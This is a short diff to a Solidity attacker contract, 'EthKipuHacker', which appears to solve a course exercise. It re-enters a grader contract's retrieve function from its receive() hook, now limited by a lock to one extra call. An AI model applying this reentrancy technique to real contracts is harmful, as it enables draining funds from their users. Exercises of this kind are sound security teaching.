@@ -10,6 +10,7 @@ interface IGrader5 {
 contract EthKipuHacker {
     IGrader5 private immutable i_grader;
     address private immutable i_owner;
+    bool private reentrancyLock;
 
     constructor(address graderAddress) {
         i_grader = IGrader5(graderAddress);
@@ -20,6 +21,7 @@ contract EthKipuHacker {
         require(msg.sender == i_owner, "You're not the owner");
         require(msg.value > 3, "Must send more than 4 wei");
 
+        reentrancyLock = false;
         i_grader.retrieve{value: msg.value}();
     }
 
@@ -29,8 +31,11 @@ contract EthKipuHacker {
     }
 
     receive() external payable {
-        if (address(this).balance > 3) {
+        // if (address(this).balance > 3) {
+        if (!reentrancyLock) {
+            reentrancyLock = true;
             i_grader.retrieve{value: 4}();
         }
+        // }
     }
 }
